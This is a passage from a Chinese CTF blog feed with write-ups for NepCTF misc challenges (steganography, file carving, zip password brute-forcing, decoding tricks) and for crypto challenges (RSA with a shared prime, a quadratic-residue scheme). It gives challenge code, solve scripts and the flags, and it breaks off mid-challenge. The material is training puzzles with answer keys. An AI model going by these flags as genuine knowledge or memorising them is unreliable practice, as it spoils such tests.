_0x5ea0a5[<span class="string">&#x27;push&#x27;</span>](_0x5ea0a5[<span class="string">&#x27;shift&#x27;</span>]());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (_0x2f82a9) &#123;</span><br><span class="line">                _0x5ea0a5[<span class="string">&#x27;push&#x27;</span>](_0x5ea0a5[<span class="string">&#x27;shift&#x27;</span>]());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;(_0x3771, <span class="number">0xcdfa7</span>));</span><br><span class="line">    <span class="built_in">console</span>.log(_0x422051(<span class="number">0xba</span>) + _0x422051(<span class="number">0xc3</span>) + _0x422051(<span class="number">0xab</span>) + _0x422051(<span class="number">0xa9</span>) +</span><br><span class="line">    <span class="string">&#x27;\x42\x2d\x34\x39&#x27;</span> + <span class="string">&#x27;\x33\x31\x2d\x41&#x27;</span> + _0x422051(<span class="number">0xb1</span>) + _0x422051(<span class="number">0xad</span>) + _0x422051(<span class="number">0xaf</span>)</span><br><span class="line">    + _0x422051(<span class="number">0xb4</span>) + <span class="string">&#x27;\x7d&#x27;</span>)</span><br><span class="line">    <span class="comment">// if (input[_0x422051(0xc0)] == _0x422051(0xba) + _0x422051(0xc3) + _0x422051(0xab) + _0x422051(0xa9) + &#x27;\x42\x2d\x34\x39&#x27; + &#x27;\x33\x31\x2d\x41&#x27; + _0x422051(0xb1) + _0x422051(0xad) + _0x422051(0xaf) + _0x422051(0xb4) + &#x27;\x7d&#x27;) &#123;</span></span><br><span class="line">    <span class="comment">//     chest_lock[_0x422051(0xbd) + &#x27;\x62\x6c\x65&#x27;] = !![], chest_unlock[_0x422051(0xbd) + &#x27;\x62\x6c\x65&#x27;] = ![], input[_0x422051(0xbd) + &#x27;\x62\x6c\x65&#x27;] = ![], balloon[&#x27;\x76\x69\x73\x69&#x27; + &#x27;\x62\x6c\x65&#x27;] = ![], dialog[_0x422051(0xc0)] = _0x422051(0xb2) + _0x422051(0xc2) + _0x422051(0xb7) + _0x422051(0xbe), dialog[_0x422051(0xb6) + &#x27;\x65&#x27;][_0x422051(0xae) + _0x422051(0xb0)] = 0x40, dialog[&#x27;\x78&#x27;] = 0xa, dialog[&#x27;\x79&#x27;] = 0x32, this[_0x422051(0xbd) + _0x422051(0xc1)] = ![];</span></span><br><span class="line">    <span class="comment">//     return;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    timeoutid != <span class="literal">null</span> &amp;&amp; <span class="built_in">clearTimeout</span>(timeoutid);</span><br><span class="line">    prompts[_0x422051(<span class="number">0xbd</span>) + _0x422051(<span class="number">0xc1</span>)] = !![], balloon[_0x422051(<span class="number">0xbd</span>) + _0x422051(<span class="number">0xc1</span>)] = !![], timeoutid = <span class="built_in">setTimeout</span>(disappear, <span class="number">0x1388</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Nep{39F24AE1-1DEB-4931-A6D6-36098DC3E558}</p><h3 id="3-出题人日记"><a href="#3-出题人日记" class="headerlink" title="3.出题人日记"></a>3.出题人日记</h3><p>一个表格文件。。这种微软的文件好像都能改后缀成压缩包打开，，</p><p>发现有hint。</p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322022219540.png" alt="image-20210322022219540"></p><p>提示了使用rot13<img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322022329285.png" alt="image-20210322022329285"></p><p>rot13解出<img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322022357621.png" alt="image-20210322022357621"></p><p>js？？能解决这个问题？</p><p>然后打开以后发现一个后缀为.flag的文件。010打开发现是png文件，改后缀，打开是一张图片。</p><p>使用Stegsolve看到A通道有点问题</p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322034925423.png" alt="image-20210322034925423"></p><p>可能A通道有问题，但是提取出来发现啥也没。。。。</p><p>想到隐写，提示说js，想了一天，想到可能是js写的工具，信息检索了一天的js隐写。找到一个在线的，成功得到flag</p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322022617802.png" alt="image-20210322022617802"></p><p>flag:Nep{D4La0_s0lve_th1s_probl3m_to_hit_c4ij1}</p><h3 id="4-我没有py"><a href="#4-我没有py" class="headerlink" title="4.我没有py"></a>4.我没有py</h3><p>下载完这个大文件，丢尽010，检索Nep{发现出现flag了？不过发现提交不了，试了半天，然后看这十六进制编码，发现可见字符i的十六进制和}的十六进制隔了3个十六进制，想到了中午，三个字节表示一个中文，尝试了一波，发现那三个字节是一起的表示一个中文的感叹号。。。不过看到下面还有一道，就想到自己可能非预期了。。。<img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322022938641.png" alt="image-20210322022938641"></p><p>flag：Nep{sharun_Aka_xiaokeai！}</p><p>这道题想到了ant3CTF.的一道misc题。。。。。。</p><h3 id="5-make-hsy-great-again"><a href="#5-make-hsy-great-again" class="headerlink" title="5.make_hsy_great_again"></a>5.make_hsy_great_again</h3><p>爆破密码，得到key：520233</p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322024049358.png" alt="image-20210322024049358"></p><p>发现文件有点点打。感觉藏了东西。</p><p>拿去提取一下，binwalk提取不出，换成foremost</p><p>成功提取</p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322024246911.png" alt="image-20210322024246911"></p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322024412019.png" alt="image-20210322024412019"></p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322024439766.png" alt="image-20210322024439766"></p><p>发现文件还是好大，可能没分解完，但是怎么尝试也没有分离出啥丢尽010看看</p><p>没发现啥，然后搞了半天，发现原图还有一张图片，不过他编码倒过来了。要翻转一下。</p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322024713123.png" alt="image-20210322024713123"></p><p>找到上一个图片的尾</p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322025010247.png" alt="image-20210322025010247"></p><p>圈圈是分割处。</p><p>删除掉上面的代码，留下下面的然后写个脚本翻转过来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;open(&#39;hhhhhhsy.png&#39;,&#39;rb&#39;)</span><br><span class="line">f&#x3D;a.read()</span><br><span class="line">ff&#x3D;f[::-1]</span><br><span class="line">b&#x3D;open(&#39;flag.png&#39;,&#39;wb&#39;)</span><br><span class="line">b.write(ff)</span><br><span class="line">b.close()</span><br></pre></td></tr></table></figure><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322025114580.png" alt="image-20210322025114580"></p><p>得到另外一张图</p><p>然后使用Stegsolve在A4的地方发现了一个假flag</p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322025807607.png" alt="image-20210322025807607"></p><p>图太大了，就不截全了。。</p><p>不过发现这个假flag在这一张图的Alpha通道。</p><p>提取一波A通道看看。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">pic = Image.<span class="built_in">open</span>(<span class="string">&#x27;flag.png&#x27;</span>)</span><br><span class="line">alpha = []</span><br><span class="line">width,height = pic.size</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,width):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,height):</span><br><span class="line">        data = (pic.getpixel((i,j)))      </span><br><span class="line">        alpha.append(data[<span class="number">3</span>])</span><br><span class="line">print(alpha)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>往上翻的时候出现了一点不寻常的东西。</p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210322034724543.png" alt="image-20210322034724543"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5, 4, 1, 0, 7, 1, 0, 1, 5, 3, 6, 9, 7, 8, 3, 2, 5, 7, 9, 7, 9, 9, 0, 6, 9, 8, 3, 9, 2, 0, 7, 6, 9, 1, 7, 0, 8, 8, 9, 5, 0, 8, 8, 5, 0, 6, 0, 3, 8, 3, 5, 6, 8, 0, 5, 3, 8, 8, 2, 9, 0, 6, 4, 3, 6, 0, 9, 1, 3, 0, 2, 1</span><br></pre></td></tr></table></figure><p>每个数都不超过十，想到两两组合转ascii？发现不对，最后21组合是不可见字符，然后尝试一波python密码学常用的long_to_bytes发现可以解出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">s=[<span class="number">5</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    flag+=<span class="built_in">str</span>(s[i])</span><br><span class="line">print(long_to_bytes(<span class="built_in">int</span>(flag)))</span><br><span class="line"><span class="comment">#Nep&#123;Qfrost_l0v3_hsy_v3r7_m0ch&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag:Nep{Qfrost_l0v3_hsy_v3r7_m0ch}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NepCTF&quot;&gt;&lt;a href=&quot;#NepCTF&quot; class=&quot;headerlink&quot; title=&quot;NepCTF&quot;&gt;&lt;/a&gt;NepCTF&lt;/h1&gt;&lt;p&gt;id:1secsawe&lt;/p&gt;
&lt;p&gt;队名：fasfdsada&lt;/p&gt;
&lt;p&gt;分数：971&lt;/p&gt;
&lt;p&gt;排</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ACTF-CRYPTO-WP</title>
    <link href="http://example.com/2021/02/25/ACTF-CRYPTO-WP/"/>
    <id>http://example.com/2021/02/25/ACTF-CRYPTO-WP/</id>
    <published>2021-02-25T15:09:22.000Z</published>
    <updated>2021-02-25T15:09:22.867Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>蚁景杯-Crypto-wp</title>
    <link href="http://example.com/2021/02/24/%E8%9A%81%E6%99%AF%E6%9D%AF-Crypto-wp/"/>
    <id>http://example.com/2021/02/24/%E8%9A%81%E6%99%AF%E6%9D%AF-Crypto-wp/</id>
    <published>2021-02-24T10:36:14.000Z</published>
    <updated>2021-02-24T13:26:23.933Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-AES-With-RSA"><a href="#1-AES-With-RSA" class="headerlink" title="1.AES With RSA"></a>1.AES With RSA</h1><h2 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">&quot;flag&#123;&quot;</span>) <span class="keyword">and</span> flag.endswith(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">padding</span>(<span class="params">s,blocklen</span>):</span></span><br><span class="line">    length = (blocklen-<span class="built_in">len</span>(s)) % blocklen</span><br><span class="line">    <span class="keyword">return</span> s + <span class="built_in">chr</span>(length) * length</span><br><span class="line">key = urandom(<span class="number">16</span>)</span><br><span class="line">iv = urandom(<span class="number">16</span>)</span><br><span class="line">m = padding(flag,<span class="number">16</span>)</span><br><span class="line">c = AES.new(key, AES.MODE_CBC, iv).encrypt(m)</span><br><span class="line">print(c.<span class="built_in">hex</span>())</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = bytes_to_long(key)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">print(<span class="built_in">hex</span>(n).strip(<span class="string">&quot;L&quot;</span>))</span><br><span class="line">print(<span class="built_in">hex</span>(c).strip(<span class="string">&quot;L&quot;</span>))</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">m = bytes_to_long(iv)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">print(<span class="built_in">hex</span>(n).strip(<span class="string">&quot;L&quot;</span>))</span><br><span class="line">print(<span class="built_in">hex</span>(c).strip(<span class="string">&quot;L&quot;</span>))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">abd2524c33d3192c4c34dcc34d91ff5d351b4612b38f178f743e0f093d1411a0</span></span><br><span class="line"><span class="string">0x9a40bc6f9d9f2abfa62f0fd6d4bd8b90d0c93f1a0e20edd5604b9be3f985ce417937fa95596fafa23c89251954a045a5b53b8e09953d20fb300364d40a1462190346c8032ddda62fb9c94bbfa98bbb7228bf15d8f1b8e214e66012821474d3ee891e64d675b83455496848a461704b08efddb7856a82d2181037a06461921d31</span></span><br><span class="line"><span class="string">0x70150c917bb393186dd4e3db75acca61502d36d29c617831e0207d9caa86d93c70aeb909ab50878490776fa1fabac8dc0fc0010d1226d3c71a8956cf0d33102935af63f6b566fb9e824e7c52beaf6808d0aee39641cd172366cef2b692cc493e20c1cdec1fd98137b0a88cd58f1db999249b29d425e18a8e72fcb549af54869e</span></span><br><span class="line"><span class="string">0xf285514f868026e1f0bbe46ef4566ce3a32d294bad7ef529fa30a7160a97adc6a6f728fd0783f017b42aad70c00fb88ce9025cea7ceddd5840a741fc3830eef90071bb296e46189b138ab161e2eccc5c22ba40e23497e9617b925e982557c43b4ea5e6597867cdb0f85a67a4af09389d3b9e2e1d23c78a956481e025b195e4ed</span></span><br><span class="line"><span class="string">0xee1259277e826884f3c12b928126fed7901821145d8106e32f4ec77483da366af12cc64a9a0228a03104a929f7b1316110d5379eff79bad722cdf22e1b9ac07282afcebf11806fc29a2a42081ba4dbba58fdc6c1608ca00c56d83e22251e441d87ec77cbe34554ef7d15c5bb02d1c0b7890d1ea499e52f41b90cb0c32913de85</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">n1=<span class="number">0x9a40bc6f9d9f2abfa62f0fd6d4bd8b90d0c93f1a0e20edd5604b9be3f985ce417937fa95596fafa23c89251954a045a5b53b8e09953d20fb300364d40a1462190346c8032ddda62fb9c94bbfa98bbb7228bf15d8f1b8e214e66012821474d3ee891e64d675b83455496848a461704b08efddb7856a82d2181037a06461921d31</span></span><br><span class="line">print(n1)</span><br><span class="line">c1=<span class="number">0x70150c917bb393186dd4e3db75acca61502d36d29c617831e0207d9caa86d93c70aeb909ab50878490776fa1fabac8dc0fc0010d1226d3c71a8956cf0d33102935af63f6b566fb9e824e7c52beaf6808d0aee39641cd172366cef2b692cc493e20c1cdec1fd98137b0a88cd58f1db999249b29d425e18a8e72fcb549af54869e</span></span><br><span class="line">n2=<span class="number">0xf285514f868026e1f0bbe46ef4566ce3a32d294bad7ef529fa30a7160a97adc6a6f728fd0783f017b42aad70c00fb88ce9025cea7ceddd5840a741fc3830eef90071bb296e46189b138ab161e2eccc5c22ba40e23497e9617b925e982557c43b4ea5e6597867cdb0f85a67a4af09389d3b9e2e1d23c78a956481e025b195e4ed</span></span><br><span class="line">c2=<span class="number">0xee1259277e826884f3c12b928126fed7901821145d8106e32f4ec77483da366af12cc64a9a0228a03104a929f7b1316110d5379eff79bad722cdf22e1b9ac07282afcebf11806fc29a2a42081ba4dbba58fdc6c1608ca00c56d83e22251e441d87ec77cbe34554ef7d15c5bb02d1c0b7890d1ea499e52f41b90cb0c32913de85</span></span><br><span class="line">p=gcd(n1,n2)</span><br><span class="line">print(p)</span><br><span class="line">p=<span class="number">13012464124288041928877171589688144718225352447713360217690273042701544998888503005661632679150877660590319673228655642180011116651614192152211694073941897</span></span><br><span class="line">q1=n1//p</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q1-<span class="number">1</span>)</span><br><span class="line">d1=inverse(e,phi)</span><br><span class="line">q2=n2//p</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q2-<span class="number">1</span>)</span><br><span class="line">d2=inverse(e,phi)</span><br><span class="line">key = long_to_bytes(<span class="built_in">pow</span>(c1,d1,n1))</span><br><span class="line">iv =long_to_bytes(<span class="built_in">pow</span>(c2,d2,n2))</span><br><span class="line">m=<span class="string">&#x27;abd2524c33d3192c4c34dcc34d91ff5d351b4612b38f178f743e0f093d1411a0&#x27;</span></span><br><span class="line">c = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">c=c.decrypt(long_to_bytes(<span class="built_in">int</span>(m,<span class="number">16</span>)))</span><br><span class="line">print(c)</span><br><span class="line"><span class="comment">#b&#x27;flag&#123;AES_W1th_RSA_1s_Fun&#125;\x07\x07\x07\x07\x07\x07\x07&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="2-GMC"><a href="#2-GMC" class="headerlink" title="2.GMC"></a>2.GMC</h1><h2 id="题目：-1"><a href="#题目：-1" class="headerlink" title="题目："></a>题目：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;xxx&#125;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gmc</span>(<span class="params">a, p</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">pow</span>(a, (p-<span class="number">1</span>)//<span class="number">2</span>, p) == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_key</span>():</span></span><br><span class="line">    [gp,gq] = [getPrime(<span class="number">512</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line">    gN = gp * gq</span><br><span class="line">    <span class="keyword">return</span> gN, gq, gp</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_x</span>(<span class="params">gq,gp</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x = getRandomNBitInteger(<span class="number">512</span>)</span><br><span class="line">        <span class="keyword">if</span> gmc(x,gp) ^ gmc(x,gq) == -<span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> x</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_y</span>(<span class="params">gN</span>):</span></span><br><span class="line">    gy_list = []</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(gy_list) != F_LEN:</span><br><span class="line">        ty = getRandomNBitInteger(<span class="number">768</span>)</span><br><span class="line">        <span class="keyword">if</span> gcd(ty,gN) == <span class="number">1</span>:</span><br><span class="line">            gy_list.append(ty)</span><br><span class="line">    <span class="keyword">return</span> gy_list</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    flag = <span class="built_in">bin</span>(bytes_to_long(flag))[<span class="number">2</span>:]</span><br><span class="line">    F_LEN = <span class="built_in">len</span>(flag)</span><br><span class="line">    N, q, p = gen_key()</span><br><span class="line">    x = gen_x(q, p)</span><br><span class="line">    y_list = gen_y(N)</span><br><span class="line">    ciphertext = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(F_LEN):</span><br><span class="line">        tc = <span class="built_in">pow</span>(y_list[i],<span class="number">2</span>) * <span class="built_in">pow</span>(x,<span class="built_in">int</span>(flag[i])) % N</span><br><span class="line">        ciphertext.append(tc)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./output.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="built_in">str</span>(N) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(F_LEN):</span><br><span class="line">            f.write(<span class="built_in">str</span>(ciphertext[i]) + <span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="脚本："><a href="#脚本：" class="headerlink" title="脚本："></a>脚本：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">plaintext = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">n = <span class="built_in">int</span>(f.readline())</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">cipher = <span class="built_in">int</span>(line)</span><br><span class="line"><span class="keyword">if</span> jacobi(cipher,n) == -<span class="number">1</span>:</span><br><span class="line">plaintext += <span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">plaintext += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">print(long_to_bytes(<span class="built_in">int</span>(plaintext,<span class="number">2</span>)))</span><br></pre></td></tr></table></figure><h1 id="3-give-you-d"><a href="#3-give-you-d" class="headerlink" title="3.give you d"></a>3.give you d</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">from gmpy2 import *</span><br><span class="line">from libnum import *</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">from secret import flag1, flag2</span><br><span class="line">p &#x3D; getPrime(1024)</span><br><span class="line">q &#x3D; getPrime(1024)</span><br><span class="line">n &#x3D; p * q</span><br><span class="line">e1 &#x3D; 0x10001</span><br><span class="line">e2 &#x3D; getPrime(10)</span><br><span class="line">m1 &#x3D; s2n(flag1)</span><br><span class="line">m2 &#x3D; s2n(flag2)</span><br><span class="line">c1 &#x3D; pow(m1,e1,n)</span><br><span class="line">c2 &#x3D; pow(m2,e2,n)</span><br><span class="line">d1 &#x3D; invert(e1, (p-1)*(q-1))</span><br><span class="line">print(&quot;d1&#x3D;&quot;,d1)</span><br><span class="line">print(&quot;e1&#x3D;&quot;,e1)</span><br><span class="line">print(&quot;c1&#x3D;&quot;,c1)</span><br><span class="line">print(&quot;e2&#x3D;&quot;,e2)</span><br><span class="line">print(&quot;c2&#x3D;&quot;,c2)</span><br><span class="line">print(&quot;n&#x3D;&quot;,n)</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">d1&#x3D; 9760674595501947732457134417772666654580910784816074596844201976549126705054354532744195920843927665908857588327157473562216170891125640382183269947688729492002810318988357177843006032057493977990230963641128334174799854776285092800882842648831234701775647426821652455794980815493792844613781136370482076703203544329344257671121278311220536853628753281655611599927657825576986012274045522950871733649701341830267140818846021723900182040299335787072434827472099558123219735224115651119369318334014106111016265076954167859616248128341257846831841124963643146233831386180209364959204819225771569971911306452163266250257</span><br><span class="line">e1&#x3D; 65537</span><br><span class="line">c1&#x3D; 3031544832428623963829906203623666284826018126199675444023110501554085620562976921090566814311982177229076467389126296690887508093409644544972677863798265638151530384969210400494640484499273950795927369791039457791939011939112692503358690615659156690833216424157047559547652680167891276098046663088364517155401153590589041194382962115823941265534326403568233361880237227171213594784532894464467801044463414691777180394710594840327220694687433155323278247440513979172779693066168556516883948734483230577736355223376127267320269806380149257745585678220927864789251997620899712591359197840818646408155483090462327378317</span><br><span class="line">e2&#x3D; 727</span><br><span class="line">c2&#x3D; 